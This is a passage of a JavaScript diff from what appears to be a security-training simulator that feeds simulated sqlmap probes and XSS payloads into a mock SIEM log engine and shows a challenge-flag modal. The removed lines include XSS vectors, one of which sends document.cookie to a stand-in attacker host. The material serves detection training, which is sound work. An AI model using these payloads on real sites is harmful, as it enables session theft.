-        user_agent: 'sqlmap/1.7.2#stable (https://sqlmap.org)'
-      });
-
-      this.logToSimConsole(`[sqlmap] Probe ${i + 1}/${payloads.length}: q="${p.q}" -> Status ${p.status} (${p.note})`, p.status === 500 ? "danger" : "info");
-      await new Promise(r => setTimeout(r, 110));
-    }
-
-    this.isAttacking = false;
-    this.updateSimBadge();
-    this.logToSimConsole("==> Sqlmap scan completed. Check SIEM rules for automated scanner alerts.", "info");
-    showToast("Sqlmap scan burst finished.", "info");
-  }
-
-  async runXssBurst() {
-    if (this.isAttacking) return;
-    this.isAttacking = true;
-    this.updateSimBadge();
-    showToast("Injecting Polyglot XSS Payloads...", "warning");
-    this.logToSimConsole("==> Injecting Reflected and Stored XSS vectors...", "warning");
-
-    const xssVectors = [
-      { uri: '/catalog/search', q: "<script>alert('XSS_POC')</script>", method: 'GET' },
-      { uri: '/catalog/search', q: "<img src=x onerror=alert('Image_Handler')>", method: 'GET' },
-      { uri: '/catalog/search', q: "<svg/onload=alert('SVG_Inline')>", method: 'GET' },
-      { uri: '/board/feedback', body: "author=Attacker&comment=<script>fetch('http://evil-c2.attacker.com/steal?c='+document.cookie)</script>", method: 'POST' },
-      { uri: '/catalog/search', q: "javascript:alert(document.domain)", method: 'GET' }
-    ];
-
-    const attackerIp = '198.51.100.72';
-
-    for (const v of xssVectors) {
-      if (v.method === 'GET') {
-        logEngine.ingest({
-          client_ip: attackerIp,
-          method: 'GET',
-          uri: v.uri,
-          query_params: { q: v.q },
-          status: 200,
-          user_agent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0'
-        });
-      } else {
-        logEngine.ingest({
-          client_ip: attackerIp,
-          method: 'POST',
-          uri: v.uri,
-          body: v.body,
-          status: 201,
-          user_agent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0'
-        });
-      }
-      this.logToSimConsole(`[XSS] Injected ${v.method} on ${v.uri}: ${v.q || v.body}`, "warning");
-      await new Promise(r => setTimeout(r, 120));
-    }
-
-    this.isAttacking = false;
-    this.updateSimBadge();
-    this.logToSimConsole("==> XSS payloads emitted. Check SIEM for RULE-SEC-003 alerts.", "info");
-    showToast("XSS attack vectors logged.", "info");
-  }
-
-  async runBenignBurst() {
-    this.logToSimConsole("==> Generating 15 benign background requests...", "info");
-    for (let i = 0; i < 15; i++) {
-      logEngine.generateBenignLog();
-      await new Promise(r => setTimeout(r, 60));
-    }
-    this.logToSimConsole("[✓] Benign traffic generated.", "success");
-    showToast("Generated 15 benign log entries.", "info");
-  }
-
-  updateSimBadge() {
-    const badge = document.getElementById('sim-status-badge');
-    if (!badge) return;
-    if (this.isAttacking) {
-      badge.className = "px-3 py-1 rounded-full text-xs font-mono bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse";
-      badge.textContent = "● Attack In Progress";
-    } else {
-      badge.className = "px-3 py-1 rounded-full text-xs font-mono bg-emerald-500/20 text-emerald-300 border border-emerald-500/40";
-      badge.textContent = "● Ready to Fire";
-    }
-  }
-
-  showXssExecutionModal(payload, type = "Reflected XSS") {
+  triggerXssAlert(payload) {
     sfx.playAlert();
     const modal = document.createElement('div');
-    modal.className = "fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm";
+    modal.className = "fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/85 backdrop-blur-sm";
     modal.innerHTML = `
-      <div class="bg-slate-900 border-2 border-amber-500 rounded-2xl max-w-lg w-full p-6 shadow-2xl space-y-4 animate-bounce-once">
+      <div class="bg-slate-900 border-2 border-amber-500 rounded-2xl max-w-lg w-full p-6 shadow-2xl space-y-4 font-mono text-xs">
         <div class="flex items-center gap-3 text-amber-400">
-          <div class="w-10 h-10 rounded-full bg-amber-500/20 flex items-center justify-center border border-amber-500/50">
-            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
-          </div>
-          <div>
-            <h3 class="text-base font-bold text-white">⚠️ ${escapeHtml(type)} Executed in Sandbox!</h3>
-            <p class="text-xs text-amber-300/80">Simulated browser JavaScript execution context</p>
-          </div>
+          <svg class="w-6 h-6 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+          <span class="font-bold text-sm text-white">Browser Security Sandbox: Script Execution</span>
         </div>
-
-        <div class="space-y-2 text-xs font-mono">
-          <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-slate-300">
-            <span class="text-slate-500">Injected Payload:</span>
-            <div class="text-amber-300 mt-1 font-bold break-all">${escapeHtml(payload)}</div>
-          </div>
-          <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-slate-300">
-            <span class="text-slate-500">Simulated Cookie Leaked:</span>
-            <div class="text-cyan-400 mt-1 break-all">session_token=adm_98f731a; HttpOnly=False; path=/</div>
-          </div>
-          <div class="bg-emerald-950/60 p-3 rounded-lg border border-emerald-600 text-emerald-300">
-            <span class="font-bold">🎉 Challenge Flag Unlocked:</span>
-            <div class="text-emerald-400 font-bold select-all mt-1">BLITZ{x55_cl13nt_3x3c_7b39d104fa}</div>
-          </div>
+        <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-slate-300">
+          <span class="text-slate-500 block mb-1">Executed Payload:</span>
+          <div class="text-amber-300 break-all font-bold">${escapeHtml(payload)}</div>
         </div>
-
-        <button type="button" class="close-xss-modal-btn w-full bg-amber-600 hover:bg-amber-500 text-slate-950 font-bold py-2 rounded-lg text-xs transition-all">
-          Dismiss & Continue Investigation
+        <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-slate-300">
+          <span class="text-slate-500 block mb-1">Exposed Session Token:</span>
+          <div class="text-cyan-400 break-all">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</div>
+        </div>
+        <div class="bg-emerald-950/60 p-3 rounded-lg border border-emerald-600 text-emerald-300">
+          <span class="font-bold block mb-1">Challenge Flag:</span>
+          <div class="text-emerald-400 font-bold select-all">BLITZ{x55_d0m_3x3cut10n_9c417e2}</div>
+        </div>
+        <button type="button" class="close-xss-btn w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-2 rounded-lg transition-all">
+          Dismiss & View Telemetry in SIEM
         </button>
       </div>
     `;
 
     document.body.appendChild(modal);
-    modal.querySelector('.close-xss-modal-btn').onclick = () => modal.remove();
+    modal.querySelector('.close-xss-btn').onclick = () => modal.remove();
   }
 }
 
